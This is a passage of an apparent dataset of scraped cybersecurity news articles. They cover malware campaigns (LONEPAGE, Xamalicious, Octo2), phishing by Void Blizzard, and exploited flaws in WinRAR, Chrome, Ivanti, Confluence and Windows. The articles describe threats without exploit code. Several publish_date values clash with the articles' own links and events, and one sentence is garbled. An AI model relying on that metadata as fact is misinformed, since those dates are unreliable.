ZIP files exploit the WinRAR vulnerability (CVE-2023-38831, CVSS score: 7.8) to distribute LONEPAGE.\nIn the former, the SFX file houses an LNK shortcut that's disguised as a DOCX file for a court summons while using the icon for Microsoft WordPad to entice the victim into opening it, resulting in the execution of malicious PowerShell code that drops the LONEPAGE malware.\nThe other attack sequence uses a specially crafted ZIP archive that's susceptible to CVE-2023-38831, with Deep Instinct finding two such artifacts created by UAC-0099 on August 5, 2023, three days after WinRAR maintainers released a patch for the bug. \"\nThe tactics used by 'UAC-0099' are simple, yet effective,\" the company said. \"\nDespite the different initial infection vectors, the core infection is the same — they rely on PowerShell and the creation of a scheduled task that executes a VBS file.\"\nThe development comes as CERT-UA warned of a new wave of phishing messages purporting to be outstanding Kyivstar dues to propagate a remote access trojan known as Remcos RAT.\nThe agency attributed the campaign to UAC-0050.","num_sentences":13,"metadata":{"source":"blog","platform":"thehackernews","filename":"UAC-0099"}}
{"id":161,"title":"Russian Hackers Breach 20+ NGOs Using Evilginx Phishing via Fake Microsoft Entra Pages","publish_date":"2024-04-28","link":"https://thehackernews.com/2025/05/russian-hackers-breach-20-ngos-using.html","clean_text":"Microsoft has shed light on a previously undocumented cluster of malicious activity originating from a Russia-affiliated threat actor dubbed Void Blizzard (aka Laundry Bear) that it said is attributed to \"worldwide cloud abuse.\"\nActive since at least April 2024, the hacking group is linked to espionage operations mainly targeting organizations that are important to Russian government objectives, including those in government, defense, transportation, media, non-governmental organizations (NGOs), and healthcare sectors in Europe and North America. \"\nThey often use stolen sign-in details that they likely buy from online marketplaces to gain access to organizations,\" the Microsoft Threat Intelligence team said in a report published today. \"\nOnce inside, they steal large amounts of emails and files.\"\nAttacks mounted by Void Blizzard have been found to disproportionately single out NATO member states and Ukraine, suggesting that the adversary is looking to collect intelligence to further Russian strategic objectives.\nSpecifically, the threat actor is known to target government organizations and law enforcement agencies in NATO member states and countries that provide direct military or humanitarian support to Ukraine.\nIt's also said to have staged successful attacks aimed at education, transportation, and defense verticals in Ukraine.\nThis includes the October 2024 compromise of several user accounts belonging to a Ukrainian aviation organization that had been previously targeted by Seashell Blizzard, a threat actor tied to the Russian General Staff Main Intelligence Directorate (GRU), in 2022.\nThe attacks are characterized as opportunistic and targeted high-volume efforts that are engineered to breach targets deemed of value to the Russian government.\nInitial access methods comprise unsophisticated techniques like password spraying and stolen authentication credentials.\nIn some of the campaigns, the threat actor has utilized stolen credentials likely sourced from commodity information stealer logs available on the cybercrime underground to access Exchange and SharePoint Online and harvest email and files from compromised organizations. \"\nThe threat actor has also in some cases enumerated the compromised organization's Microsoft Entra ID configuration using the publicly available AzureHound tool to gain information about the users, roles, groups, applications, and devices belonging to that tenant,\" Microsoft said.\nAs recently as last month, the Windows maker said it observed the hacking crew shifting to \"more direct methods\" to steal passwords, such as sending spear-phishing emails that are engineered to trick victims into parting with their login information by means of an adversary-in-the-middle (AitM) landing pages.\nThe activity entails the use of a typosquatted domain to impersonate the Microsoft Entra authentication portal to target over 20 NGOs in Europe and the United States.\nThe email messages claimed to be from an organizer from the European Defense and Security Summit and contained a PDF attachment with fake invitations to the summit.\nPresent wishing the PDF document is a malicious QR code that redirects to an attacker-controlled domain (\"micsrosoftonline[.]com\") that hosts a credential phishing page.\nIt's believed that the phishing page is based on the open-source Evilginx phishing kit.\nPost-compromise actions after gaining initial access encompass the abuse of Exchange Online and Microsoft Graph to enumerate users' mailboxes and cloud-hosted files, and then make use of automation to facilitate bulk data collection.\nIn select instances, the threat actors are also said to have accessed Microsoft Teams conversations and messages via the web client application. \"\nMany of the compromised organizations overlap with past – or, in some cases, concurrent – targeting by other well-known Russian state actors, including Forest Blizzard, Midnight Blizzard, and Secret Blizzard,\" Microsoft said. \"\nThis intersection suggests shared espionage and intelligence collection interests assigned to the parent organizations of these threat actors.\"\nVoid Blizzard Linked to September Breach of Dutch Police Agency In a separate advisory, the Netherlands Defence Intelligence and Security Service (MIVD) attributed Void Blizzard to a September 23, 2024, breach of a Dutch police employee account via a pass-the-cookie attack, stating work-related contact information of police employees was obtained by the threat actor.\nPass-the-cookie attack refers to a scenario where an attacker uses stolen cookies obtained via information stealer malware to sign in to accounts without having to enter a username and password.\nIt's currently not known what other information was stolen, although it's highly likely that other Dutch organisations were also targeted. \"\nLaundry Bear is looking for information about the purchase and production of military equipment by Western governments and Western supplies of weapons to Ukraine,\" said MIVD director, Vice Admiral Peter Reesink, in a statement.","num_sentences":25,"metadata":{"source":"blog","platform":"thehackernews","filename":"Void Blizzard"}}
{"id":162,"title":"New Sneaky Xamalicious Android Malware Hits Over 327,000 Devices","publish_date":null,"link":"https://thehackernews.com/2023/12/new-sneaky-xamalicious-android-malware.html","clean_text":"A new Android backdoor has been discovered with potent capabilities to carry out a range of malicious actions on infected devices.\nDubbed Xamalicious by the McAfee Mobile Research Team, the malware is so named for the fact that it's developed using an open-source mobile app framework called Xamarin and abuses the operating system's accessibility permissions to fulfill its objectives.\nIt's also capable of gathering metadata about the compromised device and contacting a command-and-control (C2) server to fetch a second-stage payload, but only after determining if it fits the bill.\nThe second stage is \"dynamically injected as an assembly DLL at runtime level to take full control of the device and potentially perform fraudulent actions such as clicking on ads, installing apps, among other actions financially motivated without user consent,\" security researcher Fernando Ruiz said.\nThe cybersecurity firm said it identified 25 apps that come with this active threat, some of which were distributed on the official Google Play Store since mid-2020.\nThe apps are estimated to have been installed at least 327,000 times.\nA majority of the infections have been reported in Brazil, Argentina, the U.K., Australia, the U.S., Mexico, and other parts of Europe and the Americas.\nSome of the apps are listed below - - Essential Horoscope for Android (com.anomenforyou.essentialhoroscope) - 3D Skin Editor for PE Minecraft (com.littleray.skineditorforpeminecraft) - Logo Maker Pro (com.vyblystudio.dotslinkpuzzles) - Auto Click Repeater (com.autoclickrepeater.free) - Count Easy Calorie Calculator (com.lakhinstudio.counteasycaloriecalculator) - Sound Volume Extender (com.muranogames.easyworkoutsathome) - LetterLink (com.regaliusgames.llinkgame) - NUMEROLOGY: PERSONAL HOROSCOPE &NUMBER PREDICTIONS (com.\nUshak.\nNPHOROSCOPENUMBER) - Step Keeper: Easy Pedometer (com.browgames.stepkeepereasymeter) - Track Your Sleep (com.shvetsStudio.trackYourSleep) - Sound Volume Booster (com.devapps.soundvolumebooster) - Astrological Navigator: Daily Horoscope & Tarot (com.\nOsinko.\nHoroscopeTaro) - Universal Calculator (com.Potap64.universalcalculator) Xamalicious, which typically masquerades as health, games, horoscope, and productivity apps, is the latest in a long list of malware families that abuse Android's accessibility services, requesting users' access to it upon installation to carry out privileged actions, including granting additional permissions to itself as required. \"\nTo evade analysis and detection, malware authors encrypted all communication and data transmitted between the C2 and the infected device, not only protected by HTTPS, it's encrypted as a JSON Web Encryption (JWE) token using RSA-OAEP with a 128CBC-HS256 algorithm,\" Ruiz noted.\nEven more troublingly, the first-stage dropper contains functions to self-update the main Android package (APK) file, meaning it can be weaponized to act as spyware or banking trojan without any user interaction.\nMcAfee said it identified a link between Xamalicious and an ad-fraud app named Cash Magnet, which facilitates app download and automated clicker activity to illicitly earn revenue by clicking on ads. \"\nAndroid applications written in non-java code with frameworks such as Flutter, react native and Xamarin can provide an additional layer of obfuscation to malware authors that intentionally pick these tools to avoid detection and try to stay under the radar of security vendors and keep their presence on apps markets,\" Ruiz said.\nIn a statement shared with The Hacker News, Google said Play Protect safeguards Android users against the malware both on and off the Play Store. \"\nIf a user already had one of these apps known to contain the malware installed, the user received a warning and it was automatically uninstalled from their device,\" the company added. \"\nIf a user tries to install an app with this identified malware, they'll get a warning and the app will be blocked from being installed.\"\nAndroid Phishing Campaign Targets India With Banker Malware The disclosure comes as the cybersecurity company detailed a phishing campaign that employs social messaging apps like WhatsApp to distribute rogue APK files that impersonate legitimate banks such as the State Bank of India (SBI) and prompt the user to install them to complete a mandatory Know Your Customer (KYC) procedure.\nOnce installed, the app asks the user to grant it SMS-related permissions and redirects to a fake page that not only captures the victim's credentials but also their account, credit/debit card, and national identity information.\nThe harvested data, alongside the intercepted SMS messages, are subsequently forwarded to an actor-controlled server, thereby allowing the adversary to complete unauthorized transactions.\nIt's worth noting that Microsoft last month warned of a similar campaign that utilizes WhatsApp and Telegram as distribution vectors to target Indian online banking users. \"\nIndia underscores the acute threat posed by this banking malware within the country's digital landscape, with a few hits found elsewhere in the world, possibly from Indian SBI users living in other countries,\" researchers Neil Tyagi and Ruiz said. (\nThe story was updated after publication to include a statement from Google.)","num_sentences":25,"metadata":{"source":"blog","platform":"thehackernews","filename":"Xamalicious"}}
{"id":163,"title":"Urgent: New Chrome Zero-Day Vulnerability Exploited in the Wild - Update ASAP","publish_date":null,"link":"https://thehackernews.com/2023/12/urgent-new-chrome-zero-day.html","clean_text":"Google has rolled out security updates for the Chrome web browser to address a high-severity zero-day flaw that it said has been exploited in the wild.\nThe vulnerability, assigned the CVE identifier CVE-2023-7024, has been described as a heap-based buffer overflow bug in the WebRTC framework that could be exploited to result in program crashes or arbitrary code execution.\nClément Lecigne and Vlad Stolyarov of Google's Threat Analysis Group (TAG) have been credited with discovering and reporting the flaw on December 19, 2023.\nNo other details about the security defect have been released to prevent further abuse, with Google acknowledging that \"an exploit for CVE-2023-7024 exists in the wild.\"\nGiven that WebRTC is an open-source project and that it's also supported by Mozilla Firefox and Apple Safari, it's currently not clear if the flaw has any impact beyond Chrome and Chromium-based browsers.\nThe development marks the resolution of the eighth actively exploited zero-day in Chrome since the start of the year - - CVE-2023-2033 (CVSS score: 8.8) - Type confusion in V8 - CVE-2023-2136 (CVSS score: 9.6) - Integer overflow in Skia - CVE-2023-3079 (CVSS score: 8.8) - Type confusion in V8 - CVE-2023-4762 (CVSS score: 8.8) - Type confusion in V8 - CVE-2023-4863 (CVSS score: 8.8) - Heap buffer overflow in WebP - CVE-2023-5217 (CVSS score: 8.8) - Heap buffer overflow in vp8 encoding in libvpx - CVE-2023-6345 (CVSS score: 9.6) - Integer overflow in Skia A total of 26,447 vulnerabilities have been disclosed so far in 2023, surpassing the previous year by over 1,500 CVEs, according to data compiled by Qualys, with 115 flaws exploited by threat actors and ransomware groups.\nRemote code execution, security feature bypass, buffer manipulation, privilege escalation, and input validation and parsing flaws emerged as the top vulnerability types.\nUsers are recommended to upgrade to Chrome version 120.0.6099.129/130 for Windows and 120.0.6099.129 for macOS and Linux to mitigate potential threats.\nUsers of Chromium-based browsers such as Microsoft Edge, Brave, Opera, and Vivaldi are also advised to apply the fixes as and when they become available.","num_sentences":9,"metadata":{"source":"blog","platform":"thehackernews","filename":"chrome-zero-day"}}
{"id":164,"title":"CISA Flags Critical Ivanti vTM Vulnerability Amid Active Exploitation Concerns","publish_date":"2024-08-28","link":"https://thehackernews.com/2024/09/cisa-flags-critical-ivanti-vtm.html","clean_text":"The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday added a critical security flaw impacting Ivanti Virtual Traffic Manager (vTM) to its Known Exploited Vulnerabilities (KEV) catalog, based on evidence of active exploitation.\nThe vulnerability in question is CVE-2024-7593 (CVSS score: 9.8), which could be exploited by a remote unauthenticated attacker to bypass the authentication of the admin panel and create rogue administrative users. \"\nIvanti Virtual Traffic Manager contains an authentication bypass vulnerability that allows a remote, unauthenticated attacker to create a chosen administrator account,\" CISA said.\nThe issue was patched by Ivanti in vTM versions 22.2R1, 22.3R3, 22.5R2, 22.6R2, and 22.7R2 in August 2024.\nThe agency did not reveal any specifics on how the shortcoming is being weaponized in real-world attacks and who may be behind them, but Ivanti had previously noted that a proof-of-concept (PoC) is publicly available.\nIn light of the latest development, Federal Civilian Executive Branch (FCEB) agencies are required to remediate the identified flaw by October 15, 2024, to secure their networks.\nIn recent months, several flaws affecting Ivanti devices have come under active exploitation in the wild, including CVE-2024-8190 and CVE-2024-8963.\nThe software services provider acknowledged that it's aware of a \"limited number of customers\" who have been targeted by both the issues.\nData shared by Censys shows that there are 2,017 exposed Ivanti Cloud Service Appliance (CSA) instances online as of September 23, 2024, most of which are located in the U.S. It's currently not known how many of these are actually susceptible.","num_sentences":9,"metadata":{"source":"blog","platform":"thehackernews","filename":"cisa-flags"}}
{"id":165,"title":"New Octo2 Android Banking Trojan Emerges with Device Takeover Capabilities","publish_date":null,"link":"https://thehackernews.com/2024/09/new-octo2-android-banking-trojan.html","clean_text":"Cybersecurity researchers have discovered a new version of an Android banking trojan called Octo that comes with improved capabilities to conduct device takeover (DTO) and perform fraudulent transactions.\nThe new version has been codenamed Octo2 by the malware author, Dutch security firm ThreatFabric said in a report shared with The Hacker News, adding campaigns distributing the malware have been spotted in European countries like Italy, Poland, Moldova, and Hungary. \"\nThe malware developers took actions to increase the stability of the remote actions capabilities needed for Device Takeover attacks,\" the company said.\nSome of the malicious apps containing Octo2 are listed below - - Europe Enterprise (com.xsusb_restore3) - Google Chrome (com.havirtual06numberresources) - NordVPN (com.handedfastee5) Octo was first flagged by the company in early 2022, describing it as the work of a threat actor who goes by the online aliases Architect and goodluck.\nIt has been assessed to be a \"direct descendant\" of the Exobot malware originally detected in 2016, which also spawned another variant dubbed Coper in 2021. \"\nBased on the source code of the banking Trojan Marcher, Exobot was maintained until 2018 targeting financial institutions with a variety of campaigns focused on Turkey, France and Germany as well as Australia, Thailand and Japan,\" ThreatFabric noted at the time. \"\nSubsequently, a 'lite' version of it was introduced, named ExobotCompact by its author, the threat actor known as 'android' on dark-web forums.\"\nThe emergence of Octo2 is said to have been primarily driven by the leak of the Octo source code earlier this year, leading other threat actors to spawn multiple variants of the malware.\nAnother major development is Octo's transition to a malware-as-a-service (MaaS) operation, per Team Cymru, enabling the developer to monetize the malware by offering it to cybercriminals who are looking to carry out information theft operations. \"\nWhen promoting the update, the owner of Octo announced that Octo2 will be available for users of Octo1 at the same price with early access,\" ThreatFabric said. \"\nWe can expect that the actors that were operating Octo1 will switch to Octo2, thus bringing it to the global threat landscape.\"\nOne of the significant improvements to Octo2 is the introduction of a Domain Generation Algorithm (DGA) to create the command-and-control (C2) server name, as well as improving its overall stability and anti-analysis techniques.\nThe use of a DGA-based C2 system has an inherent advantage in that it allows the threat actor to easily shift to new C2 servers, rendering domain name blocklists ineffective and improving resilience against potential takedown attempts.\nThe rogue Android apps distributing the malware are created using a known APK binding service called Zombinder, which makes it possible to trojanize legitimate applications such that they retrieve the actual malware (in this case, Octo2) under the guise of installing a \"necessary plugin.\"\nThere is presently no evidence to suggest that Octo2 is propagated via the Google Play Store, indicating that users are likely either downloading them from untrusted sources or being tricked into installing them via social engineering.\nA Google spokesperson confirmed to The Hacker News that the company did not find any evidence of the malware on the official storefront, and that Google Play Protect automatically protects users from known versions of the malware. \"\nWith the original Octo malware's source code already leaked and easily accessible to various threat actors, Octo2 builds on this foundation with even more robust remote access capabilities and sophisticated obfuscation techniques,\" ThreatFabric said. \"\nThis variant's ability to invisibly perform on-device fraud and intercept sensitive data, coupled with the ease with which it can be customized by different threat actors, raises the stakes for mobile banking users globally.\" (\nThe story was updated after publication on October 4, 2024, to include a response from Google.)","num_sentences":19,"metadata":{"source":"blog","platform":"thehackernews","filename":"octo2"}}
{"id":166,"title":"Attackers Use Public Exploits to Throttle Atlassian Confluence Flaw | Threatpost","publish_date":"2020-12-28","link":"https://threatpost.com/public-exploits-atlassian-confluence-flaw/179887/","clean_text":"Threat actors are using public exploits to pummel a critical zero-day remote code execution (RCE) flaw that affects all versions of a popular collaboration tool used in cloud and hybrid server environments and allows for complete host takeover.\nResearchers from Volexity uncovered the flaw in Atlassian Confluence Server and Data Center software over the Memorial Day weekend after they detected suspicious activity on two internet-facing web servers belonging to a customer running the software, they said in a blog post published last week.\nThe researchers tracked the activity to a public exploit for the vulnerability, CVE-2022-26134, that’s been spreading rapidly, and subsequently reported the flaw to Atlassian.\nAs observed by Volexity researchers, what’s being described as an “OGNL injection vulnerability” appears to allow for a Java Server Page (JSP) webshell to be written into a publicly accessible web directory on Confluence software. “\nThe file was a well-known copy of the JSP variant of the China Chopper webshell,” researchers wrote. “\nHowever, a review of the web logs showed that the file had barely been accessed.\nThe webshell appears to have been written as a means of secondary access.”\nAtlassian released a security advisory the same day that Volexity went public with the flaw, warning customers that all supported version of Confluence Server and Data Center after version 1.3.0 were affected and that no updates were available.\nThis prompted the U.S. Department of Homeland Security’s Cybersecurity and Infrastructure Agency (CISA) to issue a warning of its own about the flaw.\nA day later, Atlassian released an update that fixes the following versions of the affected products: 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4 and 7.18.1; it’s also strongly recommending that customers update as soon as they can.\nIf that’s not possible, the company provided in the advisory what it stressed is a “temporary” workaround for the flaw by updating a list of specific files that correspond to specific versions of the product.\nThreat Escalation In the meantime, the situation is escalating quickly into one that security professionals said could reach epic proportions, with exploits surfacing daily and hundreds of unique IP addresses already throttling the vulnerability.\nMany versions of the affected products also remain unpatched, which also creates a dangerous situation. “\nCVE-2022-26134 is about as bad as it gets,” observed Naveen Sunkavalley, chief architect of security firm Horizon3.ai, in an email to Threatpost.\nKey issues are that the vulnerability is quite easy both to find and exploit, with the latter possible using a single HTTP GET request, he said.\nMoreover, the public exploits recently released that allow attackers to use the flaw to enable arbitrary command execution and take over the host against a number of Confluence versions—including the latest unpatched version, 7.18.0, according to tests that Horizon3.ai has conducted, Sunkavaley said.\nIndeed, Twitter was blowing up over the past weekend with discussions about public exploits for the vulnerability.\nOn Saturday, Andrew Morris, the CEO of cybersecurity firm GreyNoise tweeted that they had begun to see 23 unique IP addresses exploiting the Atlassian vulnerabilities.\nOn Monday, Morris tweeted again that the number of unique IP addresses attempting to exploit the flaw had risen to 400 in just a 24-hour period.\nPotential for a SolarWinds 2.0?\nSunkavalley pointed out that the most obvious impact of the vulnerability is that attackers can easily compromise public-facing Confluence instances to gain a foothold into internal networks, and then proceed from there to unleash even further damage. “\nConfluence instances often contain a wealth of user data and business-critical information that is valuable for attackers moving laterally within internal networks,” Sunkavalley said.\nWhat’s more, the vulnerability is a source-code issue, and attacks at this level “are some of the most effective and long reaching attacks on the IT ecosystem,” observed Garret Grajek, CEO of security firm YouAttest.\nThe now-infamous Solarwinds supply-chain attack that started in December 2020 and extended well into 2021 was an example of the level of damage and magnitude of threat that embedded malware can have, and the Confluence bug has the potential to create a similar scenario, he said. “\nBy attacking the source code base the hackers are able to manipulate the code to become, in fact, agents of the hacking enterprise, cryptographically registered as legitimate components on the IT system,” Grajek said.\nFor this reason, it’s “imperative that enterprises review their code and most importantly the identities that have control of the source system, like Atlassian, to ensure restrictive and legitimate access to their vital code bases,” he asserted.","num_sentences":26,"metadata":{"source":"blog","platform":"threatPost","filename":"Atlassian"}}
{"id":167,"title":"CISA Urges Patch of Exploited Windows 11 Bug by Aug. 2 | Threatpost","publish_date":null,"link":"https://threatpost.com/cisa-urges-patch-11-bug/180235/","clean_text":"A Windows 11 vulnerability, part of Microsoft’s Patch Tuesday roundup of fixes, is being exploited in the wild, prompting the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to advise patching of the elevation of privileges flaw by August 2.\nThe recommendation is directed at federal agencies and concerns CVE-2022-22047, a vulnerability that carries a CVSS score of high (7.8) and exposes Windows Client Server Runtime Subsystem (CSRSS) used in Windows 11 (and earlier versions dating back to 7) and also Windows Server 2022 (and earlier versions 2008, 2012, 2016 and 2019) to attack. [\nFREE On-demand Event: Join Keeper Security’s Zane Bond in a Threatpost roundtable and learn how to securely access your machines from anywhere and share sensitive documents from your home office.\nWATCH HERE.]\nThe CSRSS bug is an elevation of privileges vulnerability that allows adversaries with a pre-established foothold on a targeted system to execute code as an unprivileged user.\nWhen the bug was first reported by Microsoft’s own security team earlier this month it was classified as a zero-day, or a known bug with no patch.\nThat patch was made available on Tuesday July 5.\nResearchers at FortiGuard Labs, a division of Fortinet, said the threat the bug poses to business is “medium”.\nIn a bulletin, researchers explain the downgraded rating because an adversary needs advanced “local” or physical access to the targeted system to exploit the bug and a patch is available.\nThat said, an attacker who has previously gained remote access to a computer system (via malware infection) could exploit the vulnerability remotely. “\nAlthough there is no further information on exploitation released by Microsoft, it can be surmised that an unknown remote code execution allowed for an attacker to perform lateral movement and escalate privileges on machines vulnerable to CVE-2022-22047, ultimately allowing for SYSTEM privileges,” FortiGuard Labs wrote.\nOffice and Adobe Documents Entry Points While the vulnerability is being actively exploited, there are no known public proof of concept exploits in the wild that can be used to help mitigate or sometimes fuel attacks, according to a report by The Record. “\nThe vulnerability allows an attacker to execute code as SYSTEM, provided they can execute other code on the target,” wrote Trend Micro’s Zero Day Initiative (ZDI) in its Patch Tuesday roundup last week. “\nBugs of this type are typically paired with a code execution bug, usually a specially crafted Office or Adobe document, to take over a system.\nThese attacks often rely on macros, which is why so many were disheartened to hear Microsoft’s delay in blocking all Office macros by default,” wrote ZDI author Dustin Childs.\nMicrosoft recently said it would block the use of Visual Basic for Applications (VBA) macros by default in some of its Office apps, however set no timeline enforce the policy.\nCISA added the Microsoft bug to its running list of known exploited vulnerabilities on July 7 (search “CVE-2022-22047” to find the entry) and recommends simply, “apply updates per vendor instructions”. [\nFREE On-demand Event: Join Keeper Security’s Zane Bond in a Threatpost roundtable and learn how to securely access your machines from anywhere and share sensitive documents from your home office.\nWATCH HERE.]\nImage: Courtesy of Microsoft","num_sentences":20,"metadata":{"source":"blog","platform":"threatPost","filename":"CISA"}}
{"id":168,"title":"Microsoft Patches ‘Dogwalk’ Zero-Day and 17 Critical Flaws | Threatpost","publish_date":"2020-01-28","link":"https://threatpost.com/microsoft-patches-dogwalk-zero-day-and-17-critical-flaws/180378/","clean_text":"Microsoft is urging users to patch a zero-day vulnerability dubbed Dogwalk that is actively being exploited in the wild.\nThe bug (CVE-2022-34713) is tied to a Microsoft Windows Support Diagnostic Tool and allows a remote attacker to execute code on a vulnerable system.\nThe warning is part of a massive August Patch Tuesday update that included 121 flaws, 17 of which were critical and 101 carrying a Common Vulnerability Scoring System rating of Important. “\nThe volume of fixes released this month is markedly higher than what is normally expected in an August release.\nIt’s almost triple the size of last year’s August release, and it’s the second largest release this year,” wrote Dustin Childs, Zero Day Initiative manager, in a Tuesday blog post.\nDogwalk Flaw Was Over Two-Years Old The actively exploited Dogwalk bug was first reported to Microsoft in January 2020 by researcher Imre Rad.\nHowever, it wasn’t until a separate researchers began tracking the exploitation of a flaw dubbed Follina (CVE-2022-30190) that the Dogwalk bug was rediscovered.\nThat renewed interest in Dogwalk appears to have motivated Microsoft to add the patch to this month’s round of fixes, according to a Tenable Patch Tuesday roundup report.\nMicrosoft states that CVE-2022-34713 is a “variant of” Dogwalk, but different.\nMicrosoft scored the vulnerability as Important and warns that the exploitation of the bug can only be preformed by an adversary with physical access to a vulnerable computer.\nHowever, researchers at Zero Day Initiative outline how a remote attack might occur. “\nThere is an element of social engineering to this as a threat actor would need to convince a user to click a link or open a document,” Childs wrote.\nMicrosoft describes a possible attack as having a low complexity value, meaning it can be exploited easily and requires no advance system privileges to execute. “\nThis bug also allows code execution when MSDT is called using the URL protocol from a calling application, typically Microsoft Word,” Childs wrote. “\nIt’s not clear if this vulnerability is the result of a failed patch or something new,” he added.\n17 Critical Flaws The most serious of the vulnerabilities patched on Tuesday include a trio of elevation of privilege vulnerabilities opening instances of Microsoft Exchange Server to attack.\nMicrosoft has released a separate alert page for this flaw to help mitigate the flaws. “\nAll three vulnerabilities require authentication and user interaction to exploit — an attacker would need to entice a target to visit a specially crafted Exchange server, likely through phishing,” wrote Tenable regarding the Exchange Server bugs.\nBack in the Patch Tuesday spotlight is a critical flaw (CVE-2022-35804) in Microsoft’s Server Message Block (SMB) client and server running on Windows 11 systems using Microsoft SMB 3.1.1 (SMBv3), according to the company.\nMicrosoft categorized the bug as “Exploitation More Likely” and assigned an 8.8 severity rating to the flaw.\nThe flaw only affects Windows 11, which Zero Day Initiative said, “implies some new functionality introduced this vulnerability.”\nResearchers there said the SMB flaw could potentially be wormable between affected Windows 11 systems only when SMB server is enabled. “\nDisabling SMBv3 compression is a workaround for this bug, but applying the update is the best method to remediate the vulnerability,” wrote Childs.\nRated between 8.5 to 9.8 in severity, Microsoft patched a remote code execution flaw (CVE-2022-34715) in its Windows Network File System.\nThis is the fourth month in a row that Microsoft has deployed a critical NFS code execution patch.\nInterestingly, Microsoft describes the flaw as Important, while researchers warn the bug is Critical and should be a priority patch. “\nTo exploit this, a remote, unauthenticated attacker would need to make a specially crafted call to an affected NFS server.\nThis would provide the threat actor with code execution at elevated privileges.\nMicrosoft lists this as Important severity, but if you’re using NFS, I would treat it as Critical.\nDefinitely test and deploy this fix quickly,” advises Zero Day Initiative.\nIn related news, Adobe patched 25 CVEs on Tuesday tackling bugs in Adobe Acrobat and Reader, Commerce, Illustrator, FrameMaker and Adobe Premier Elements.","num_sentences":31,"metadata":{"source":"blog","platform":"threatPost","filename":"Dogwalk"}}
{"id":169,"title":"Follina Exploited by State-Sponsored Hackers | Threatpost","publish_date":null,"link":"https://threatpost.com/follina-exploited-by-state-sponsored-hackers/179890/","clean_text":"Researchers have added state-sponsored hackers to the list of adversaries attempting to exploit Microsoft’s now-patched Follina vulnerability.\nAccording to researchers at Proofpoint, state-sponsored hackers have attempted to abuse the Follina vulnerability in Microsoft Office, aiming an email-based exploit at U.S. and E.U. government targets via phishing campaigns.\nProofpoint researchers spotted the attacks and believe the adversaries have ties to a government, which it did not identify.\nAttacks consist of campaigns targeting victims U.S. and E.U. government workers.\nMalicious emails contain fake recruitment pitches promising a 20 percent boost in salaries and entice recipients to download an accompanying attachment.\nThe text states, “You’ll be getting a [20%]sic increase in your salary.”\nThe message prompts recipients to open an attached document “before this weekend” to learn more.\nIn a Twitter-based statement, Sherrod DeGrippo, vice president of threat research at Proofpoint, said about 10 Proofpoint customers had received over 1,000 such messages.\nThe malicious attachment targets the remote code execution bug CVE-2022-30190, dubbed Follina.\nDiscovered last month, the flaw exploits the Microsoft Windows Support Diagnostic Tool.\nAs Microsoft explained in a blog post, the bug “exists when MSDT is called using the URL protocol from a calling application such as Word.\nAn attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application.”\nState-sponsored abuse of the flaw is just the latest in a string of Follina-related attacks.\nIf successfully exploited, attackers can use the Follina flaw to install programs, view, change or delete data, or create new accounts in the context allowed by the user’s rights, the company said. “\nA remote code execution vulnerability exists when MSDT is called using the URL protocol from a calling application such as Word,” Microsoft explained in its guidance on the Microsoft Security Response Center. “\nAn attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application.”\nMicrosoft’s workaround comes some six weeks after the vulnerability was apparently first identified.\nResearchers from Shadow Chaser Group noticed it on April 12 and patched by Microsoft in May.\nProofpoint says the malicious file used in the recruitment phishing campaigns, if downloaded, executes a script that can ultimately check for virtualized environment to abuse and “steals information from local browsers, mail clients and file services, conducts machine recon and then zips it for exfil.”\nProofpoint explained in a tweet, “The extensive reconnaissance conducted by [a] second Powershell script demonstrated an actor interested in a large variety of software on a target’s computer.”\nIt is that behavior that raised concerns that the campaign had ties to a “state aligned nexus,” researchers noted.","num_sentences":21,"metadata":{"source":"blog","platform":"threatPost","filename":"Follina"}}
{"id":170,"title":"Google Patches Chrome’s Fifth Zero-Day of the Year | Threatpost","publish_date":null,"link":"https://threatpost.com/google-patches-chromes-fifth-zero-day-of-the-year/180432/","clean_text":"Google has patched the fifth actively exploited zero-day vulnerability discovered in Chrome this year as one in a series of fixes included in a stable channel update released Wednesday.\nThe bug, tracked as CVE-2022-2856 and rated as high on the Common Vulnerability Scoring System (CVSS), is associated with “insufficient validation of untrusted input in Intents,” according to the advisory posted by Google.\nGoogle credits Ashley Shen and Christian Resell of its Google Threat Analysis Group (TAG) for reporting the zero-day bug, which could allow for arbitrary code execution, on July 19.\nThe advisory also unveiled 10 other patches for various other Chrome issues.\nIntents are a deep linking feature on the Android device within the Chrome browser that replaced URI schemes, which previously handled this process, according to Branch, a company that offers various linking options for mobile applications. “\nInstead of assigning window.location or an iframe.src to the URI scheme, in Chrome, developers need to use their intent string as defined in this document,” the company explained on its website.\nIntent “adds complexity” but “automatically handles the case of the mobile app not being installed” within links, according to the post.\nInsufficient validation is associated with input validation, a frequently-used technique for checking potentially dangerous inputs to ensure that they are safe for processing within the code, or when communicating with other components, according to MITRE’s Common Weakness Enumeration site. “\nWhen software does not validate input properly, an attacker is able to craft the input in a form that is not expected by the rest of the application,” according to a post on the site. “\nThis will lead to parts of the system receiving unintended input, which may result in altered control flow, arbitrary control of a resource, or arbitrary code execution.”\nFending Off Exploits As is typical, Google did not disclose specific details of the bug until it is widely patched to avoid threat actors taking further advantage of it, a strategy that one security professional noted is a wise one. “\nPublicizing details on an actively exploited zero-day vulnerability just as a patch becomes available could have dire consequences, because it takes time to roll out security updates to vulnerable systems and attackers are champing at the bit to exploit these types of flaws,” observed Satnam Narang, senior staff research engineer at cybersecurity firm Tenable, in an email to Threatpost.\nHolding back info is also sound given that other Linux distributions and browsers, such as Microsoft Edge, also include code based on Google’s Chromium Project.\nThese all could be affected if an exploit for a vulnerability is released, he said. “\nIt is extremely valuable for defenders to have that buffer,” Narang added.\nWhile the majority of the fixes in the update are for vulnerabilities rated as high or medium risk, Google did patch a critical bug tracked as CVE-2022-2852, a use-after-free issue in FedCM reported by Sergei Glazunov of Google Project Zero on Aug. 8.\nFedCM—short for the Federated Credential Management API–provides a use-case-specific abstraction for federated identity flows on the web, according to Google.\nFifth Chrome 0Day Patch So Far The zero-day patch is the fifth Chrome bug under active attack that Google has patched so far this year.\nIn July, the company fixed an actively exploited heap buffer overflow flaw tracked as CVE-2022-2294 in WebRTC, the engine that gives Chrome its real-time communications capability, while in May it was a separate buffer overflow flaw tracked as CVE-2022-2294 and under active attack that got slapped with a patch.\nIn April, Google patched CVE-2022-1364, a type confusion flaw affecting Chrome’s use of the V8 JavaScript engine on which attackers already had pounced.\nThe previous month a separate type-confusion issue in 